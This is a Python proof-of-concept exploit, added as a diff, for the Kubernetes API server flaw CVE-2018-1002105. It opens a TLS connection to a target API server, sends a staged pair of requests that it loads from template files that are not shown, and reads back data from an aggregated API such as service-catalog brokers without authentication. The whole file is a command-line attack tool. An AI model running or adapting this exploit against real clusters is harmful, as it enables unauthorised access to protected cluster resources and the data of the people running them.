@@ -1,0 +1,169 @@
+#!/usr/bin/env python3
+import argparse
+from ssl import wrap_socket
+from json import loads, dumps
+from socket import create_connection
+
+
+def request_stage_1(base, version, target):
+
+    stage_1 = ""
+
+    with open('ustage_1', 'r') as stage_1_fd:
+        stage_1 = stage_1_fd.read()
+
+    return stage_1.format(base, version, target
+                          ).encode('utf-8')
+
+
+def request_stage_2(base, version, target_api, target):
+
+    stage_2 = ""
+
+    with open('ustage_2', 'r') as stage_2_fd:
+        stage_2 = stage_2_fd.read()
+
+    return stage_2.format(base, version, target_api, target,
+                          ).encode('utf-8')
+
+
+def read_data(ssock):
+
+    data = []
+    data_incoming = True
+
+    while data_incoming:
+        data_in = ssock.recv(4096)
+
+        if not data_in:
+            data_incoming = False
+
+        elif data_in.find(b'\n\r\n0\r\n\r\n') != -1:
+            data_incoming = False
+
+        offset_1 = data_in.find(b'{')
+        offset_2 = data_in.find(b'}\n')
+
+        if offset_1 != -1 and offset_2 != -1:
+            data_in = data_in[offset_1-1:offset_2+1]
+
+        elif offset_1 != -1:
+            data_in = data_in[offset_1-1:]
+
+        elif offset_2 != -1:
+            data_in = data_in[:offset_2-1]
+
+        data.append(data_in)
+
+    return data
+
+
+def run_exploit(target, stage_1, stage_2, filename, json):
+
+    host, port = target.split(':')
+
+    with create_connection((host, port)) as sock:
+
+        with wrap_socket(sock) as ssock:
+            print('[*] Building pipe ...')
+            ssock.send(stage_1)
+
+            data_in = ssock.recv(15)
+
+            if b'HTTP/1.1 200 OK' in data_in:
+                print('[+] Pipe opened :D')
+                read_data(ssock)
+
+            else:
+                print('[-] Not sure if this went well...')
+
+            print(f"[*] Attempting to access url")
+
+            ssock.send(stage_2)
+            data_in = ssock.recv(15)
+
+            if b'HTTP/1.1 200 OK' in data_in:
+                print('[+] Pipe opened :D')
+
+            data = read_data(ssock)
+
+            return data
+
+
+def parse_output(data, json, filename):
+
+    if json:
+        j = loads(''.join(i.decode('utf-8')
+                          for i in data))
+
+        data = dumps(j, indent=4)
+
+        if filename:
+            mode = 'w+'
+
+        else:
+            mode = 'wb+'
+
+    if filename:
+        print(f"[*] Writing output to {filename} ....")
+
+        with open(filename, mode) as fd:
+            if json:
+                fd.write(data)
+
+            else:
+                for msg in data:
+                    fd.write(msg)
+
+            print('[+] Done!')
+
+    else:
+        if json:
+            print(data)
+
+        else:
+            print(''.join(msg.decode('unicode_escape') for msg in data))
+
+
+def main():
+
+    parser = argparse.ArgumentParser(description='Unauthenticated PoC for'
+                                                 ' CVE-2018-1002105')
+    required = parser.add_argument_group('required arguments')
+    optional = parser.add_argument_group('optional arguments')
+
+    required.add_argument('--target', '-t', dest='target', type=str,
+                          help='API server target:port', required=True)
+    required.add_argument('--api-base', '-b', dest='base', type=str,
+                          help='Target API name i.e. "servicecatalog.k8s.io"',
+                          default="servicecatalog.k8s.io")
+    required.add_argument('--api-target', '-u', dest='target_api', type=str,
+                          help='API to access i.e. "clusterservicebrokers"',
+                          default="clusterservicebrokers")
+
+    optional.add_argument('--api-version', '-a', dest='version', type=str,
+                          help='API version to use i.e. "v1beta1"',
+                          default="v1beta1")
+    optional.add_argument('--json', '-j', dest='json', action='store_true',
+                          help='Print json output', default=False)
+    optional.add_argument('--filename', '-f', dest='filename', type=str,
+                          help='File to save output to', default=False)
+
+    args = parser.parse_args()
+
+    if args.target.find(':') == -1:
+        print("f[-] invalid target {args.target}")
+        return False
+
+    stage1 = request_stage_1(args.base, args.version, args.target)
+
+    stage2 = request_stage_2(args.base, args.version, args.target_api,
+                             args.target)
+
+    output = run_exploit(args.target, stage1, stage2, args.filename, args.json)
+
+    parse_output(output, args.json, args.filename)
+
+
+if __name__ == '__main__':
+    main()
